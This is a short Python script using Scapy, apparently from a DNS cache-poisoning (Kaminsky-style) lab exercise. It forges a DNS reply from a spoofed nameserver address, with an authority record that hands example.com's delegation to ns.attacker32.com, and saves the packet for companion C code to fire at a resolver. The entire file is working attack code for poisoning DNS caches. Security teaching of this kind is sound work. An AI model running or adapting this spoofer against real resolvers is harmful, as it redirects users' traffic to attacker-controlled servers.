#!/bin/env python3
from scapy.all import *

# The source IP can be any address, because it will be replaced 
# by the C code with the IP address of example.com's actual nameserver. 
ip  = IP (dst = '10.9.0.53', src = '199.43.133.53')

udp = UDP(dport = 33333, sport = 53,  chksum=0)

# Construct the Question section
# The C code will modify the qname field
Qdsec  = DNSQR(qname  = "austi.example.com")

# Construct the Answer section (the answer can be anything)
# The C code will modify the rrname field
Anssec = DNSRR(rrname = "austi.example.com",
               type   = 'A', 
               rdata  = '1.2.3.4', 
               ttl    = 259200)

# Construct the Authority section (the main goal of the attack) 
NSsec  = DNSRR(rrname = 'example.com', 
               type   = 'NS', 
               rdata  = 'ns.attacker32.com',
               ttl    = 259200)

# Construct the DNS part 
# The C code will modify the id field
dns    = DNS(id  = 0xAAAA, aa=1, rd=1, qr=1, 
             qdcount = 1, qd = Qdsec,
             ancount = 1, an = Anssec, 
             nscount = 1, ns = NSsec)

# Construct the IP packet and save it to a file.
Replypkt = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(Replypkt))

